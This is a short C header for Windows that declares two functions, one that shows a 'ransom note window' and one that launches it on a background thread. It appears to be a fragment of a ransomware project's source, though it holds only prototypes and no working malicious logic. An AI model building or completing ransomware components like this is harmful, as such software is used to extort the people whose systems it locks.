#ifndef RANSOMNOTE_H
#define RANSOMNOTE_H

#include <windows.h>

/* Display the ransom note window (blocking — runs its own message loop) */
void ShowRansomNoteWindow(void);

/* Launch the window on a background thread (non-blocking) */
void LaunchRansomNoteAsync(void);

#endif /* RANSOMNOTE_H */